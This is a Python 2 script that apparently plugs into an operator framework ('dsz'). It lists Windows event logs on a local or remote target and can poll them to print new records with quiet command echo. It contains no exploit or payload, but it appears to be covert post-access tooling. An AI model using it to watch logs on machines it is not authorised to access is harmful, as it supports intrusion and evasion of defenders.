
import dsz, dsz.cmd, dsz.control
import ops, ops.pprint
import ops.data
import traceback, sys
from optparse import OptionParser

def monitorlogs(interval=300, classic=False, logname='', target=None, filters=[]):
    logquerycmd = 'eventlogquery '
    if classic:
        logquerycmd += ' -classic '
    elif (logname != ''):
        logquerycmd += (' -log %s ' % logname)
    if target:
        logquerycmd += (' -target %s ' % target)
    z = dsz.control.Method()
    dsz.control.echo.Off()
    (success, cmdid) = dsz.cmd.RunEx(logquerycmd, dsz.RUN_FLAG_RECORD)
    logsbase = ops.data.getDszObject(cmdid=cmdid).eventlog
    try:
        while True:
            dsz.Sleep((interval * 1000))
            (success, cmdid) = dsz.cmd.RunEx(logquerycmd, dsz.RUN_FLAG_RECORD)
            stamp = dsz.Timestamp()
            newlogs = ops.data.getDszObject(cmdid=cmdid).eventlog
            for i in range(len(newlogs)):
                (oldlog, newlog) = (logsbase[i], newlogs[i])
                if (newlog.mostrecentrecordnum > oldlog.mostrecentrecordnum):
                    dsz.control.echo.Off()
                    ops.info(('New logs in %s as of %s' % (oldlog.name, stamp)))
                    try:
                        newrecs = recordquery(logname=oldlog.name, start=(oldlog.mostrecentrecordnum + 1), end=newlog.mostrecentrecordnum, target=target)
                    except:
                        ops.error(('Error getting records for log %s' % oldlog.name))
                        traceback.print_exc(sys.exc_info())
                        continue
                    if (not newrecs):
                        ops.error(('Error getting records for log %s' % oldlog.name))
                        continue
                    if (len(newrecs) > 0):
                        ops.info(('-----------------New logs in %s-------------------' % oldlog.name))
                    for newrec in newrecs:
                        print ('%d: %d - %s %s' % (newrec.number, newrec.id, newrec.datewritten, newrec.timewritten))
                        print ('User: %s --- Computer: %s' % (newrec.user, newrec.computer))
                        print ('Source: %s' % newrec.source)
                        print ('Type: %s' % newrec.eventtype)
                        stringslist = ''
                        for strval in newrec.string:
                            stringslist += (strval.value + ', ')
                        print ('Strings: %s' % stringslist)
                        print '---------------------------------------------------------'
            logsbase = newlogs
    except RuntimeError as ex:
        if (ex.args[0] == 'User QUIT SCRIPT'):
            ops.info('You quit monitoring')
            return
    except KeyboardInterrupt:
        ops.info('You hit Ctrl-D, which means you want to stop monitoring logs, so I am stopping')
        return

def recordquery(logname=None, start=None, end='', **params):
    if (logname is None):
        ops.error('You must specify a log to query records')
        return None
    if (start is None):
        ops.error('You must specify record numbers to query records')
        return None
    cmd = ('eventlogquery -log "%s" -record %d %s' % (logname, start, end))
    if (('target' in params) and (params['target'] is not None)):
        cmd += (' -target %s' % params['target'])
    x = dsz.control.Method()
    dsz.control.echo.Off()
    (success, cmdid) = dsz.cmd.RunEx(cmd, dsz.RUN_FLAG_RECORD)
    if success:
        return ops.data.getDszObject(cmdid=cmdid).record
    else:
        ops.error(('Your command "%s" failed to run, please see your logs for command ID %d for further details' % (cmd, cmdid)))
        return None

def logquery(logname=None, target=None, classic=False, **params):
    cmd = 'eventlogquery '
    if classic:
        cmd += ' -classic '
    if (target is not None):
        cmd += (' -target %s ' % target)
    if (logname is not None):
        cmd += (' -log "%s" ' % logname)
    x = dsz.control.Method()
    dsz.control.echo.Off()
    (success, cmdid) = dsz.cmd.RunEx(cmd, dsz.RUN_FLAG_RECORD)
    if success:
        return ops.data.getDszObject(cmdid=cmdid)
    else:
        ops.error(('Your command "%s" failed to run, please see your logs for command ID %d for further details' % (cmd, cmdid)))
        return None

def printlogtable(logs):
    restable = []
    for log in filter((lambda x: (x.numrecords > 0)), logs.eventlog):
        restable.append({'name': log.name, 'records': log.numrecords, 'recordspan': ('%s - %s' % (log.oldestrecordnum, log.mostrecentrecordnum)), 'moddatetime': ('%s %s' % (log.lastmodifieddate, log.lastmodifiedtime))})
    restable.sort(key=(lambda x: x['moddatetime']))
    ops.pprint.pprint(restable, ['Log name', 'Last date', 'Range'], ['name', 'moddatetime', 'recordspan'])
if (__name__ == '__main__'):
    usage = 'python windows\\eventloqs.py [Options]\n-m, --monitor \n    Runs in monitor mode, defaults to false\n-i, --interval [timeinterval]\n    Interval between eventlogquery commands to use when running in monitor mode\n-l, --log [logname]\n    Restricts query/monitor to one log\n-c, --classic\n    If present, only queries System/Security/Application logs\n-t, --target\n    Remote target to query\n'
    parser = OptionParser(usage=usage)
    parser.add_option('-m', '--monitor', dest='monitor', action='store_true', default=False)
    parser.add_option('-c', '--classic', dest='classic', action='store_true', default=False)
    parser.add_option('-i', '--interval', dest='interval', type='int', action='store', default='300')
    parser.add_option('-l', '--log', dest='logname', type='string', action='store', default='')
    parser.add_option('-t', '--target', dest='target', type='string', action='store', default=None)
    (options, args) = parser.parse_args(sys.argv)
    if options.monitor:
        monitorlogs(options.interval, options.classic, options.logname, options.target)
    else:
        logs = logquery(options.logname, options.target, options.classic)
        printlogtable(logs)